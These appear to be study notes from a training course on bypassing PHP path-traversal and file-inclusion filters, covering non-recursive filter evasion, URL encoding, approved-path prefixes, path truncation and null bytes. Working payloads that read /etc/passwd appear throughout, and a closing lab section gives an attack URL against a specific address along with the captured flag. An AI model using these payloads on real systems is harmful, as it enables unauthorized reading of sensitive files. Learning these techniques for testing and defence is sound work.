# Basic Bypasses

## Non-Recursive Path Traversal Filters

Example of protection which filters ../ :
$language = str_replace('../', '', $_GET['language']);

--> This kind of payload will not work anymore : ../../../../etc/passwd

However, this filter is very insecure, as it is not recursively removing the ../ substring

-> It works if we use that payload :

....//....//....//....//etc/passwd

We may also use :
..././
....\/

## Encoding

If the developer filters character such as . OR /

--> May be bypassed by URL encoding our input

URL encode ../ into %2e%2e%2f

Furthermore, we can also use Burp Decoder to encode the encoded string once again to have a double encoded string, which may also bypass other types of filters.

Core PHP filters on versions 5.3.4 and earlier were specifically vulnerable to this bypass,

## Approved Paths

If the developer use RegEx to check if the file is in a specific directory :

if(preg_match('/^\.\/languages\/.+$/', $_GET['language'])) {
    include($_GET['language']);
} else {
    echo 'Illegal path specified!';
}

--> To bypass this, we may use path traversal and start our payload with the approved path, and then use ../ to go back 

Furthermore, we can fuzz web directories under the same path, and try different ones until we get a match

./languages/../../../../etc/passwd

## Appended Extension

If the developer add a .php extension we won't be able to read other files than PHP ones.

2 techniques only work with PHP versions before 5.3/5.4 (before 5.5 for NULL Bytes) :

### Path Truncation

In earlier versions of PHP, defined strings have a maximum length of 4096 characters, likely due to the limitation of 32-bit systems.

If a longer string is passed, it will simply be truncated, and any characters after the maximum length will be ignored.

For PHP
////etc/passwd is the same than /etc/passwd
/etc/./passwd is the same than /etc/passwd

--> Create very long strings that evaluate to a correct path

Finally, it is also important to note that we would also need to start the path with a non-existing directory for this technique to work.

Payload : ?language=non_existing_directory/../../../etc/passwd/./././.[./ REPEATED ~2048 times]

Generated by : echo -n "non_existing_directory/../../../etc/passwd/" && for i in {1..2048}; do echo -n "./"; done
non_existing_directory/../../../etc/passwd/./././<SNIP>././././

calculate the full length of the string to ensure only .php


### Null Bytes

Adding a null byte (%00) at the end of the string would terminate the string and not consider anything after it

This is because in memory must use a null byte to indicate the end of the string, as seen in Assembly, C, or C++ languages.

payload : /etc/passwd%00

## LAB

Burp
http://83.136.253.251:43598/index.php?language=languages/....//....//....//....//flag.txt
HTB{64$!c_f!lt3r$_w0nt_$t0p_lf!}
